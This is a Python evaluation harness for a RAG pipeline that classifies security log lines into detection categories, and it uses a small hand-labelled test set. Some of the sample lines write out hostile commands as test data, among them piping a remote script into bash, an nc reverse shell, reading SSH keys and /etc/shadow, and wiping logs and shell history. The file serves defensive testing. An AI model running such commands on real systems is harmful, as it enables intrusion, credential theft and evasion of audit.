"""
Labeled retrieval eval harness for the Cerise RAG pipeline.

There is no production log corpus yet, so EVAL_SET below is a small hand-written
set of realistic log lines per RAG_docs category, plus a handful of benign/unrelated
lines that should NOT confidently match any category. It exists to answer one
question objectively: did a given change to indexer.py / log_watcher.py actually
improve retrieval, or did it just change behavior? Any threshold, prompt, or
reranking change to the RAG pipeline should be re-run through this script before
being trusted.

Usage: python eval_rag.py
"""
import sys
from log_watcher import RagRetriever

# (raw log line, expected category file) -- expected=None means "should NOT
# confidently match any category" (benign activity or activity outside the 9
# known detection categories).
EVAL_SET = [
    ("comm=nginx pid=4021 uid=0 syscall=ptrace target_pid=982 target_uid=1000", "dangerous_syscalls.md"),
    ("comm=worker.py pid=771 syscall=bpf cmd=BPF_PROG_LOAD prog_type=kprobe", "dangerous_syscalls.md"),
    ("comm=sh pid=90 syscall=setns fd=11 nstype=CLONE_NEWNET (unexpected caller: app_worker)", "dangerous_syscalls.md"),

    ("comm=python3 pid=330 connect AF_UNIX /var/run/docker.sock", "docker_socket_access.md"),
    ("comm=curl pid=331 GET http:/v1.43/containers/json via /var/run/docker.sock", "docker_socket_access.md"),
    ("comm=app pid=44 mount --bind /var/run/docker.sock /rootfs/var/run/docker.sock", "docker_socket_access.md"),

    ("comm=bash pid=5 execve memfd_create anonymous_fd=3 no_backing_file", "fileless_execution.md"),
    ("comm=payload pid=88 mmap PROT_EXEC anonymous region, no file on disk", "fileless_execution.md"),
    ("comm=curl pid=90 pipe curl http://x.x.x.x/s.sh | bash -", "fileless_execution.md"),

    ("comm=insmod pid=12 init_module rootkit.ko loaded by unprivileged shell", "kernel_module_load.md"),
    ("comm=modprobe pid=13 finit_module suspicious.ko from /tmp", "kernel_module_load.md"),
    ("comm=bash pid=14 write to /sys/kernel/... unexpected module parameter", "kernel_module_load.md"),

    ("comm=bash pid=201 rm -f /var/log/auth.log; truncate -s 0 /var/log/syslog", "log_tampering.md"),
    ("comm=sh pid=202 unset HISTFILE; history -c", "log_tampering.md"),
    ("comm=root pid=203 systemctl stop systemd-journald", "log_tampering.md"),

    ("comm=curl pid=553 connect to 45.9.12.3:4444", "network_suspicious.md"),
    ("comm=nc pid=554 nc -e /bin/sh 185.220.101.5 8080", "network_suspicious.md"),
    ("comm=python3 pid=555 socket connect to known Tor exit node port 9001", "network_suspicious.md"),

    ("comm=app pid=901 setuid(0) called from non-root process after exploit", "privilege_escalation.md"),
    ("comm=sh pid=902 sudo -u root /bin/bash with no tty and no interactive session", "privilege_escalation.md"),
    ("comm=x pid=903 chmod u+s /tmp/backdoor unexpected setuid bit set", "privilege_escalation.md"),

    ("comm=python3 pid=884 open /etc/shadow O_RDONLY", "sensitive_file_access.md"),
    ("comm=cat pid=885 cat ~/.ssh/id_rsa from unrelated web process", "sensitive_file_access.md"),
    ("comm=bash pid=886 read /etc/kubernetes/admin.conf", "sensitive_file_access.md"),

    ("comm=nginx pid=101 execve /bin/sh -c whoami spawned from web server", "suspicious_exec.md"),
    ("comm=java pid=102 execve /tmp/.hidden/x1 recently dropped binary", "suspicious_exec.md"),
    ("comm=www-data pid=103 execve base64 -d payload.b64 | sh", "suspicious_exec.md"),

    ("comm=cron pid=1 scheduled backup job wrote 400MB to /backup/daily.tar.gz", None),
    ("comm=sshd pid=50 accepted publickey for deploy from 10.0.0.5 port 51820", None),
    ("comm=apt pid=60 upgrading openssl to 3.0.14 via unattended-upgrades", None),
    ("comm=nginx pid=70 GET /health HTTP/1.1 200 12ms", None),
    ("comm=postgres pid=80 checkpoint complete, wrote 214 buffers", None),
]


def sweep_threshold(rows):
    """
    Pick the threshold that maximizes Youden's J statistic (TPR - FPR) over the
    candidate thresholds actually observed in this eval set. This is a data-driven
    replacement for guessing a "reasonable-looking" score: the cross-encoder's raw
    logit scale is calibrated on MS MARCO web passages, not security telemetry, so
    there is no a priori reason a hand-picked number like 0.0 means anything here.
    """
    candidates = sorted({round(score, 2) for _, _, score in rows})
    best = None
    for t in candidates:
        tp = sum(1 for exp, top, s in rows if exp is not None and top == exp and s >= t)
        fn = sum(1 for exp, top, s in rows if exp is not None and not (top == exp and s >= t))
        fp = sum(1 for exp, top, s in rows if exp is None and s >= t)
        tn = sum(1 for exp, top, s in rows if exp is None and s < t)
        tpr = tp / (tp + fn) if (tp + fn) else 0.0
        fpr = fp / (fp + tn) if (fp + tn) else 0.0
        j = tpr - fpr
        if best is None or j > best[1]:
            best = (t, j, tpr, fpr)
    return best


def evaluate():
    retriever = RagRetriever()
    if not retriever.collection or retriever.collection.count() == 0:
        print("[ERROR] Vector DB is empty or unavailable. Run indexer.py first.")
        sys.exit(1)

    rows = []  # (expected, raw_predicted, score) -- raw_category ignores the gate
    print(f"{'expected':<26}{'top candidate':<26}{'score':>8}")
    print("-" * 70)
    for query, expected in EVAL_SET:
        result = retriever.retrieve_context(query)
        top_predicted = result["raw_category"] + ".md" if result["raw_category"] != "UNKNOWN" else "UNKNOWN"
        rows.append((expected, top_predicted, result["score"]))
        print(f"{str(expected):<26}{top_predicted:<26}{result['score']:>8.2f}")

    print("-" * 70)

    positive_scores = [s for exp, _, s in rows if exp is not None]
    negative_scores = [s for exp, _, s in rows if exp is None]
    total_positive = len(positive_scores)

    threshold, j, tpr, fpr = sweep_threshold(rows)
    hits_at_threshold = sum(1 for exp, top, s in rows if exp is not None and top == exp and s >= threshold)

    print(f"Untresholded top-1 accuracy (ranking quality only): "
          f"{sum(1 for exp, top, _ in rows if exp is not None and top == exp)}/{total_positive}")
    print(f"Correct-match score range:    min={min(positive_scores):.2f} max={max(positive_scores):.2f}")
    print(f"Benign/unrelated score range: min={min(negative_scores):.2f} max={max(negative_scores):.2f}")
    print(f"\nBest MIN_RERANK_SCORE found: {threshold:.2f}  (TPR={tpr:.0%}, FPR={fpr:.0%}, J={j:.2f})")
    print(f"At this threshold: hit-rate@1 = {hits_at_threshold}/{total_positive} = {hits_at_threshold/total_positive:.0%}")
    print("Update MIN_RERANK_SCORE in log_watcher.py / log_watcher_injector.py with this value.")
    if j < 0.5:
        print("\n[WARNING] J is low: no single absolute threshold cleanly separates relevant from "
              "irrelevant matches in this domain. This is expected given the domain gap between raw "
              "log lines and prose fact sheets (see HyDE) and the fact that the cross-encoder was not "
              "fine-tuned on this data (see finetune_embeddings.py). Treat the threshold as a coarse "
              "filter, not a reliable confidence score, until real production data is collected.")


if __name__ == "__main__":
    evaluate()
